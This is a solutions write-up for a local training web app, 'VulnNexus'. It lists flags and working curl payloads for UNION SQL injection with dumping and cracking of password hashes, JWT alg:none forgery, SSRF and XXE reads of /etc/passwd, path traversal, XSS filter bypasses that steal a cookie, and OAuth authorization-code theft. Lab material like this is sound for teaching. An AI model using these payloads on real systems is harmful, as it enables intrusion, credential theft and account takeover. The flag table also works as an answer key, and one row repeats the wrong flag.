---
tags: [css-exam, labs, solution, web]
---
# VulnNexus (app 2 — medium→hard) — Solutions
> ↑ Lab Kit · method: Web Penetration Test Checklist

`B=http://localhost:8001`. Six flags. Try each yourself first. (Track them on the 📊 Progress page.)

## 🏁 Flags — one per vuln
| Vuln | Flag | How |
|---|---|---|
| UNION SQLi | `FLAG{un10n_sql1_dumps_the_secrets_table}` | `UNION SELECT k,v,3 FROM secrets` |
| JWT forgery | `FLAG{jwt_4lg_none_or_w3ak_s3cret_forg3d_admin}` | forge `role=admin` → `account.php` |
| SSRF | `FLAG{ssrf_reached_the_internal_metadata_service}` | `fetch.php?url=http://127.0.0.1:8001/metadata.php` |
| Path traversal | `FLAG{tr4versed_out_of_the_docs_directory}` | `download.php?file=../private2/secret_config.txt` |
| XXE | `FLAG{tr4versed_out_of_the_docs_directory}` | external entity → `file:///…/webapp2/private2/secret_config.txt` (or read `/etc/passwd` to prove it) |
| Filtered XSS | `FLAG{xss_filter_byp4ss_c00kie}` | bypass the filter (`<img onerror>`) → steal the non-HttpOnly `flag` cookie via `document.cookie` |
| OAuth (redirect_uri) | `FLAG{oauth_redirect_uri_not_validated}` | `oauth_authorize.php?redirect_uri=<attacker>` → steal code → `oauth_callback.php?code=` |

## 7. OAuth — unvalidated `redirect_uri` (auth-code theft)
**Answer:** the authorization endpoint sends the victim's auth code to **any** `redirect_uri` (no allow-list), so an attacker steals the code and logs in as the victim (`admin`).
**Command:**
```
# 1) the lure link makes the admin's code redirect to the ATTACKER's URL (your listener):
curl -s -D - "$B/oauth_authorize.php?redirect_uri=http://127.0.0.1:9002/&state=x" -o /dev/null | grep -i location
#    -> Location: http://127.0.0.1:9002/?code=<CODE>&state=x   (the code leaked to the attacker)
# 2) replay the stolen code at the callback:
curl -s "$B/oauth_callback.php?code=<CODE>"
```
**Result:** `FLAG{oauth_redirect_uri_not_validated}` — authenticated as admin. **Reason:** a real OAuth server must validate `redirect_uri` against the value registered for the `client_id`; here it's attacker-controlled → authorization-code theft → account takeover. Deck: Broken Authentication / JWT Attacks.

## 1. UNION SQL injection  (`search.php?q=`)
**Answer:** `q` concatenated into a 3-column query → UNION-dump the `secrets` table.
**Command:**
```
curl -sG "$B/search.php" --data-urlencode "q=' UNION SELECT k,v,3 FROM secrets-- -"
# find columns first:  q=' ORDER BY 3-- -   (ok)   / ORDER BY 4-- - (error)
```
**Result:** `FLAG{un10n_sql1_dumps_the_secrets_table}` + `admin_pw`. **Reason:** `"...name LIKE '%$q%'"`, 3 columns (name,category,price).
Deck: SQLi_Course_Labs · SQLi_Exploitation_Methodology.

**Bonus — dump + crack the `users` table** (realistic "SQLi → hash-ID → cracking → account takeover").
The table mixes **several hash algorithms** — this is a *hash-identification* drill. Dump the hashes **and
the salt column** (some rows are salted, some are not):
```
# enumerate first: information_schema.tables -> products, users, secrets
# the users columns include salt:  information_schema.columns -> ...,password,salt,role
' UNION SELECT GROUP_CONCAT(username,0x3a,password,0x3a,salt,0x3a,role SEPARATOR 0x0a),2,3 FROM users-- -
```
→ `username:hash:salt:role`. Now **identify each hash** (`hashid '<hash>'` or `hash-identifier`) and pick
the right mode — the lengths/prefixes give it away (32 hex = MD5, 40 = SHA-1, 64 = SHA-256, `$2y$` = bcrypt):

| user | hash | salt | algorithm | crack it with | plaintext |
|---|---|---|---|---|---|
| j.doe | `84d961…a576` (32 hex) | — | unsalted MD5 | `hashcat -m 0` / `john --format=raw-md5` | `superman` |
| a.smith | `e68e11…361e` (40 hex) | — | unsalted SHA-1 | `hashcat -m 100` / `john --format=raw-sha1` | `trustno1` |
| m.chen | `f145d6…d5d1` (64 hex) | `Tb82nR` | **salted** SHA-256 `sha256($pass.$salt)` | `hashcat -m 1410` (line `hash:salt`) | `ncc1701` |
| svc_api | `$2y$08$…` | (built-in) | **bcrypt** (cost 8) | `hashcat -m 3200` / `john --format=bcrypt` | `qwerty123` |
| admin | `99641c…79fb` (64 hex) | `kR9fQ2` | salted SHA-256 | `-m 1410` | **won't crack** (strong) |

```
# e.g. the salted SHA-256 (feed hash:salt) and the bcrypt:
printf '%s\n' 'f145d6227d344b596be8dd6624f81a099e5ccd4234d181a653c1fdfc0a13d5d1:Tb82nR' > sha256.txt
hashcat -m 1410 sha256.txt /usr/share/wordlists/rockyou.txt
printf '%s\n' '$2y$08$cguMochk7lKasJ6uKqA4dOQ8HnotyVZe7P0apRXlmfRdyP.9Vvbh.' > bc.txt
hashcat -m 3200 bc.txt /usr/share/wordlists/rockyou.txt      # slow by design — give it time
```
`admin`'s password is strong and won't fall even here — **but it equals `secrets.admin_pw`
(`Nexus!Adm1n#2026`)**, which the SQLi already leaked → takeover with no cracking at all. Lesson: **the
algorithm sets the cost** — legacy MD5/SHA-1 fall instantly, a salt forces one crack per hash, and
bcrypt's work factor is what actually buys time; none of it helps a weak or reused password.

## 2. JWT forgery  (`login.php` → `account.php`)
**Answer:** the verifier accepts **`alg:none`** *and* signs HS256 with a **weak secret** (`secret`). Either path forges `role=admin`.
**Command (alg:none — no signature needed):**
```
H=$(printf '{"alg":"none","typ":"JWT"}' | basenc --base64url | tr -d '=')
P=$(printf '{"user":"alice","role":"admin"}' | basenc --base64url | tr -d '=')
curl -s "$B/account.php" -H "Cookie: session=$H.$P."
```
**Command (weak secret — crack then sign):**
```
# get a real token from login, crack the HMAC secret:
hashcat -m 16500 token.jwt /usr/share/wordlists/rockyou.txt      # or: jwt_tool <tok> -C -d rockyou.txt  -> secret='secret'
# then forge with jwt_tool: jwt_tool <tok> -S hs256 -p 'secret' -T   (set role=admin)
```
**Result:** `FLAG{jwt_4lg_none_or_w3ak_s3cret_forg3d_admin}`. **Reason:** `alg:none` branch returns the payload unverified; HS256 secret is guessable. Deck: JWT Attacks.

## 3. SSRF  (`fetch.php?url=`)
**Answer:** the fetcher takes any URL/scheme → reach the internal metadata service and read local files.
**Command:**
```
curl -sG "$B/fetch.php" --data-urlencode "url=http://127.0.0.1:8001/metadata.php"   # internal-only service
curl -sG "$B/fetch.php" --data-urlencode "url=file:///etc/passwd"                   # file:// SSRF -> LFI
```
**Result:** `FLAG{ssrf_reached_the_internal_metadata_service}`, then `/etc/passwd`. **Reason:** `file_get_contents($url)` with no scheme/host allow-list. Deck: SSRF_Guide · SSRF_Payload.

## 4. XXE  (`import.php`, POST XML)   *(needs php-xml installed)*
**Answer:** the XML parser resolves external entities → file read.
**Command:**
```
curl -s "$B/import.php" -H "Content-Type: application/xml" --data-binary \
 '<?xml version="1.0"?><!DOCTYPE o [<!ENTITY x SYSTEM "file:///etc/passwd">]><order><item>&x;</item></order>'
```
**Result:** the `item` echoes `/etc/passwd`. **Reason:** `DOMDocument::loadXML($xml, LIBXML_NOENT|LIBXML_DTDLOAD)` — external entities enabled. Deck: XXE.

## 5. Path traversal  (`download.php?file=`)
**Answer:** `file` is appended to `docs/` with no sanitisation → climb out.
**Command:**
```
curl -sG "$B/download.php" --data-urlencode "file=../private2/secret_config.txt"
curl -sG "$B/download.php" --data-urlencode "file=../../../../../../etc/passwd"
```
**Result:** `FLAG{tr4versed_out_of_the_docs_directory}` + an internal API token. **Reason:** `readfile(__DIR__."/docs/".$file)`. Deck: Path_Traversal.

## 6. Filtered reflected XSS  (`greet.php?name=`)
**Answer:** the filter only strips a literal `<script>` (case-insensitive, once) — trivially bypassed.
**Command (two bypasses):**
```
$B/greet.php?name=<img src=x onerror=alert(document.domain)>        # no <script> tag at all
$B/greet.php?name=<scr<script>ipt>alert(1)</scr</script>ipt>        # nested: inner <script> removed -> <script> remains
```
**Result:** the payload executes. **Reason:** blacklist filtering (`str_ireplace('<script>','')`) instead of output-encoding. Deck: XSS_02_Payloads · XSS_06_CSP_Bypass.
